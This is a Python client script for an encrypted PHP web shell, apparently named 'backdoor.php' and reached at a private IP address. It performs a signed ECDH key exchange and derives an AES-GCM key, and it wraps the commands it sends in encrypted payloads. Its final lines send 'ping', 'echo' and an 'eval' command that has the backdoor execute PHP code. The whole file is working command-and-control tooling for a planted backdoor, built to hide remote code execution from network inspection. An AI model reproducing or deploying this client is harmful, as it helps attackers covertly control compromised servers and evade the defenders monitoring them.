import requests
import os
import json
import base64

from cryptography.hazmat.primitives.asymmetric import ec, padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

URL = "http://172.23.240.1/webshell/crypto/backdoor.php"

s = requests.Session()

resp = s.get(URL).json()

sign_pub_pem = resp["signPubKey"].strip().encode()
server_ecdh_pem = resp["serverEcdhPub"].strip().encode()
signature = base64.b64decode(resp["signature"])
handshake_token = resp["handshakeToken"]

pinned_sign_pub_pem = sign_pub_pem

# Verify server's ephemeral ECDH key was signed by its long-term signing key
sign_pub = load_pem_public_key(pinned_sign_pub_pem)
sign_pub.verify(
    signature,
    server_ecdh_pem,
    padding.PKCS1v15(),
    hashes.SHA256()
)
print("[+] Server identity verified")

# Ephemeral ECDH key
client_ecdh_key = ec.generate_private_key(ec.SECP256R1())
client_ecdh_pub = client_ecdh_key.public_key()
client_ecdh_pub_pem = client_ecdh_pub.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).strip()

# Long-term client signing key (ephemeral here, but could be persisted)
client_sign_key = ec.generate_private_key(ec.SECP256R1())
client_sign_pub = client_sign_key.public_key()
client_sign_pub_pem = client_sign_pub.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).strip()

# Sign our ECDH pub with our signing key (proves we own the private key)
client_sig = client_sign_key.sign(
    client_ecdh_pub_pem,
    ec.ECDSA(hashes.SHA256())
)

handshake_resp = s.post(URL, json={
    "handshakeToken" : handshake_token,
    "clientEcdhPub" : client_ecdh_pub_pem.decode(),
    "clientSignPub" : client_sign_pub_pem.decode(),
    "clientSig" : base64.b64encode(client_sig).decode(),
}).json()

if "error" in handshake_resp:
    raise Exception(f"Handshake failed: {handshake_resp['error']}")

session_token = handshake_resp["sessionToken"]
print("[+] Mutual authentication done")

server_ecdh_pub_key = load_pem_public_key(server_ecdh_pem)
shared_secret = client_ecdh_key.exchange(ec.ECDH(), server_ecdh_pub_key)

aes_key = HKDF(
    algorithm=hashes.SHA256(),
    length=32,
    salt=None,
    info=b"secure-channel"
).derive(shared_secret)

aesgcm = AESGCM(aes_key)
print("[+] AES key derived")

seq = 1

def send(cmd, data=None):
    global session_token, seq

    payload = {"cmd": cmd, "seq": seq, "data": data}

    nonce  = os.urandom(12)
    cipher = aesgcm.encrypt(nonce, json.dumps(payload).encode(), None)

    # cipher = ct + tag (last 16 bytes)
    tag = cipher[-16:]
    ct  = cipher[:-16]
    raw = base64.b64encode(nonce + tag + ct).decode('utf-8')

    resp = s.post(URL, json={
        "sessionToken": session_token,
        "payload": raw,
    }).json()

    if "error" in resp:
        raise Exception(f"Server error: {resp['error']}")

    # Update session token (server re-seals state each request)
    session_token = resp["sessionToken"]

    enc = base64.b64decode(resp["payload"])
    nonce = enc[:12]
    tag = enc[12:28]
    ct = enc[28:]

    result = aesgcm.decrypt(nonce, ct + tag, None)
    seq += 1
    return json.loads(result)

print(send("ping"))
print(send("echo", "hello world"))
print(send("eval", "echo('x');"))